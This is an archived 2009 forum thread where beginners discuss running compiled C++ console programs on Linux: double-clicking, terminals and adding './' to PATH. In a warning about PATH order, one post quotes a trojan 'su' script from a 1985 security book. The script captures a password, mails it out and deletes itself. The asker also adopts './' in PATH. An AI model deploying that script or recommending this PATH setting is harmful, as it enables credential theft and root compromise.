---
title: "Benginning C++ Question"
date: 2009-06-02
forum: Programming Talk
---

### Post by panicy on 2009-06-02
Hello All!

Just started learning C++, and Im wondering if there is anyway to run a compiled program any other way than in shell.  

After I compile the program (with g++) I get an exectuable file, but the only way to run it is in a bash shell (./file_name). Running the program in shell woks fine, but if I go the program via Places >> Home (or whatever location) I see the file, but double clicking it does nothing.

I've just started programming so Im not sure if I need to show more patience and there is more to come, or if Im missing something from the very beginning.

Any help would be great!

P.S. - Also is there a way that I can run the program without having to add the "./" before the file name? I've read on other posts about editing the .bash_profile file but I do not have one it my home folder only .bash_history, .bash_logout, .bashrc and .bashrc~

Thank you for your help in advance!
-Dustin

---

### Post by dwhitney67 on 2009-06-02
You can create an applet in which you can run your application.  You would need to run it in a terminal if there is any output to be seen; just make sure that you have a way to stop the execution of the program (using a prompt or whatever) before the program terminates so you have an opportunity to see this output.

As for doing away with the ./ prefix for running programs from the shell, edit your ~/.bashrc file to augment the PATH environment variable.

```

export PATH=./:$PATH

```

---

### Post by lensman3 on 2009-06-02
> **dwhitney67 said:**
> You can create an applet in which you can run your application.  You would need to run it in a terminal if there is any output to be seen; just make sure that you have a way to stop the execution of the program (using a prompt or whatever) before the program terminates so you have an opportunity to see this output.

As for doing away with the ./ prefix for running programs from the shell, edit your ~/.bashrc file to augment the PATH environment variable.

```

export PATH=./:$PATH

```

This is HUGE security hole.  Put the ./ at the end.  Having the ./ at the beginning allows a hacker to put the "sudo" or "su" script in the local directory and the ./ will find the local sudo/su command instead of the one in /usr/bin/sudo or su.  

```

stty -echo
echo "Password: \c"
read X
echo ""
stty echo
echo $1 $X | mail "mail to the bad creep" &
sleep 1
echo Sorry
rm su

```

The sudo password is stolen and mailed to "the creep" and then it erases itself.  All done with 9 lines of code.  And you just thought that you misspelled the password, because you will enter "sudo/su" again and get the real program.  System compromised at the root level.  If you put the ./ at the end, the shell will find the real su/sudo first and not the hacked copy.

Above code is from pg 42 Unix System Security - Wood and Kochran 1985

---

### Post by panicy on 2009-06-02
> **dwhitney67 said:**
> 
```

export PATH=./:$PATH

```

That worked great!

Thanks dwhitney!

---

### Post by TheForumTroll on 2009-06-02
Wouldn't it be easier to just chmod the file and allow it to be executed? Then doubleclicking it.

---

### Post by panicy on 2009-06-02
I think I was responding when you were typing, sorry...

So you are saying that...
```

export PATH=:$PATH./

```
is more secure then...
```

export PATH=./:$PATH

```[/quote]

both work, but if the first is more secure then I'll use that.  I appreciate it!

---

### Post by panicy on 2009-06-02
> **TheForumTroll said:**
> Wouldn't it be easier to just chmod the file and allow it to be executed? Then doubleclicking it.

after compiling with g++ the file becomes executable, but double clicking still does nothing.  Only running it in a shell gives output

---

### Post by TheForumTroll on 2009-06-02
Oh so it is a console app? Well, then i can see your problem =)

---

### Post by panicy on 2009-06-02
yeah, this is just a VERY simple console app.

But what I though you could do is double click the file and it would open a terminal and display the output, collect input, etc.  Kinda similar to a batch in windows...

But the only way I can get any out is by executing the file in shell

---

### Post by SledgeHammer_999 on 2009-06-03
It does that already. But after it outputs the console window closes. Everything happens quickly and you don't see the window.(after all you said it is a very simple app). Try putting some code that awaits user input, the console window should stay open.

---

### Post by panicy on 2009-06-03
> **SledgeHammer_999 said:**
> It does that already. But after it outputs the console window closes. Everything happens quickly and you don't see the window.(after all you said it is a very simple app). Try putting some code that awaits user input, the console window should stay open.

Some that I've wrote have input from the user, and even those dont open anything....

for example (again, very simple beginning code):
```


#include <iostream>

using namespace std;

int main()
{
cout << "Enter Your Name:\n";
string x;
cin >> x;
cout << "Hello " << x << "!\n";
cout << "Now go make something useful...\n";
return 0;
}

```

this runs fine is shell, but double clicking does nothing.  If it was happening so fast with other programs that I dont see it that would be understandable, but this should at least wait for the input from the user, right?

---

### Post by hod139 on 2009-06-03
> **panicy said:**
> I think I was responding when you were typing, sorry...

So you are saying that...
```

export PATH=:$PATH./

```is more secure then...
```

export PATH=./:$PATH

```

both work, but if the first is more secure then I'll use that.  I appreciate it!

Not quite, the ':' is the delimiter, so it should be:
```

export PATH=$PATH:./

```

---

### Post by panicy on 2009-06-03
> **hod139 said:**
> Not quite, the ':' is the delimiter, so it should be:
```

export PATH=$PATH:./

```

Very helpful!  Thanks for the info

---

### Post by Mirge on 2009-06-03
> **panicy said:**
> Some that I've wrote have input from the user, and even those dont open anything....

for example (again, very simple beginning code):
```


#include <iostream>

using namespace std;

int main()
{
cout << "Enter Your Name:\n";
string x;
cin >> x;
cout << "Hello " << x << "!\n";
cout << "Now go make something useful...\n";
return 0;
}

```this runs fine is shell, but double clicking does nothing.  If it was happening so fast with other programs that I dont see it that would be understandable, but this should at least wait for the input from the user, right?


```

#include <stdio.h>

int main(int argc, char **argv) {
    /* C example (sorry it's not C++, I haven't played with C++ in forever)... of the following code:
    cout << "Enter Your Name:\n";
    string x;
    cin >> x;
    cout << "Hello " << x << "!\n";
    cout << "Now go make something useful...\n";
    return 0;
    */

    char x[11]; // leaves room for 10 characters + 1 char for \0 (NULL)
    printf("Enter Your Name: ");
    scanf("%10s", &x);
    
    printf("Hello %s!\n", x);
    printf("Now go make something useful...\n");
    
    getchar(); // press enter to close the program.
    
    return 0;
}

```

C++ may have inherited getchar() (I assume in stdio header)... try putting getchar() before you return 0; and see if that forces an enter keypress (newline) to actually close it. If so, that'll keep the program up long enough for you to actually see it.

---

### Post by MadCow108 on 2009-06-03
c++ version of the previous poster's c version:
```

#include <iostream>

using namespace std;
int main (int argc, char *argv[])
{
    cout << "Enter Your Name:"<<endl;
    string x;
    cin >> x;
    cout << "Hello " << x << "!"<<endl;
    cout << "Now go make something useful..."<<endl;
    cin.ignore ();
    cin.get();
return 0;
}

```
ignore is necessary that get also reacts to a newline.
also replaced "\n" with << endl
this will (probably, have never tested it) insert the right line break for the right plattform (eg. \r\n windows \n unix \r mac).

---

### Post by panicy on 2009-06-03
thanks for the info madcow!

entered that code, which still runs fine in shell, but double clicking the file after compiling still does nothing

---

### Post by MadCow108 on 2009-06-03
you could create a file which opens the program in an xterm:
start_program.sh:

#!/usr/bin/bash
xterm -e "path/filename"

make it executable:
chmod u+x start_program.sh

then clickung on that will start your program in a new window

(you can  also use any other installed console, just check it's help. example: xfce4-terminal -e "path/filename")

---

### Post by dwhitney67 on 2009-06-03
> **panicy said:**
> thanks for the info madcow!

entered that code, which still runs fine in shell, but double clicking the file after compiling still does nothing

Create an applet to run your application... in a terminal.  Seriously, if you plan to perform user I/O, why would you want to want to run the app in anything other than a terminal??

---

### Post by panicy on 2009-06-03
> **dwhitney67 said:**
> Create an applet to run your application... in a terminal.  Seriously, if you plan to perform user I/O, why would you want to want to run the app in anything other than a terminal??

I know, I understand where your coming from.  As I've stated I'm new to C++ and really just wanted to know why I can run it from a terminal but when I double click it, it doesn't do anything.  

Just was curious if there was a way to do it or if I was doing something wrong...  Questions are what these forums are for right??

---

### Post by dwhitney67 on 2009-06-03
You are not doing anything wrong... the program is executing, however it is unable to use the stdout/stdin streams because you are not executing in a terminal.

If you create a .cpp file with following code, compile it, then and double-click on the icon for the executable, I guarantee you that it runs and creates a file in your /tmp directory.

```

#include <fstream>

int main()
{
  std::fstream tmpFile("/tmp/tmpFile", std::ios::out);
}

```

---

### Post by SledgeHammer_999 on 2009-06-04
@panicy
You are right, it doesn't work for console programs. I assumed that for them a terminal was opened like in Windows. I also said that, because if you create a GUI program and double click it, then it appears on screen:

```

#include <gtkmm.h>

int main (int argc, char *argv[])
{
	Gtk::Main main_loop(argc, argv);
	Gtk::Window window;
	main_loop.run(window);
	return 0;
}

```

---

### Post by panicy on 2009-06-04
when I compile that program it says that gtkmm: no such file or directory, and then goes after that and says that Gtk ahs not been declared...

do I need to run an apt-get to get that include??

---

### Post by SledgeHammer_999 on 2009-06-04
Yes it uses the gtkmm library for the GUI(gtk with C++ wrappers)

you need to install the dev files
```
sudo apt-get install libgtkmm-2.4-dev
```

And to compile it:
```
g++ main.cpp `pkg-config --libs --cflags gtkmm-2.4` -o test
```

But if you are just learning C++, don't confuse yourself with the GUI for now.

---

### Post by MadCow108 on 2009-06-04
```

#include <iostream>
#include <cstdlib>
#include <string>

using namespace std;
int main (int argc, char *argv[])
{
	if (argc == 1)
	{

		string  str="xterm -e \"pathto/program arbitrary arguments\"";
		system(str.c_str());
	}
	else
	{
		cout << "Enter Your Name:\n";
		string x;
		cin >> x;
		cout << "Hello " << x << "!"<<endl;
		cout << "Now go make something useful...\n";
		cin.ignore ();
		cin.get();
    }
    return 0;
}

```
this would be a solution to panicy wish.
but it's plattform dependant and pretty stupid (a bash script (see my post on last page) or a link in windows would be cleaner)

---

### Post by MadCow108 on 2009-06-04
If you would have read the thread you would know that your solution has been posted a few times and doesn't work.
clicking on a program will not open it  in a terminal by default (at least on panicys and my pc).

---

### Post by SledgeHammer_999 on 2009-06-04
> **nordtorp said:**
> Hi panicy,

I am also quite new to C++.

The reason you don't see anything is that the program runs very quickly.

The program performs exactly what you want it to do, then return 0 (tells the system everything went ok)

If you put in [php]cin.get();[/php] as meantioned earlier it waits for you to press enter before it continue to run.

If you want to use your code it would be something like this:
```

#include <iostream>

using namespace std;

int main()
{
string x;
 
cout << "Enter Your Name:\n";

// this will read the line and skip the '\n'
[COLOR=#000000][COLOR=#0000bb]getline[/COLOR][COLOR=#007700]([/COLOR][COLOR=#0000bb]cin[/COLOR][COLOR=#007700], [/COLOR][COLOR=#0000bb]sNick[/COLOR][COLOR=#007700], [/COLOR][COLOR=#dd0000]'\n'[/COLOR][COLOR=#007700]);
[/COLOR][/COLOR]
cout << "Hello " << x << "!\n";
cout << "Now go make something useful...\n";

cin.get(); // waiting for you to press enter.
return 0;
}

```OR you could do this

```

cout << "Enter Your Name:\n";

cin >> x; //gets input until whitespace or '\n'

but then you had to put:
cin.get(); // later to pick up the '\n' that cin >> x leave
cin.get(); // wait for keypress before existing

```Remember: I am also barely new to programming in C++.
[Link to my program in Beginner Challenge  #2]("http://ubuntuforums.org/showpost.php?p=7395482&postcount=217")

no it doesn't work. 
Do you double-click the executable? Does it open up a console window? In ubuntu 9.04 it doesn't.
Also a mistake: **sNick** should be **x**

---

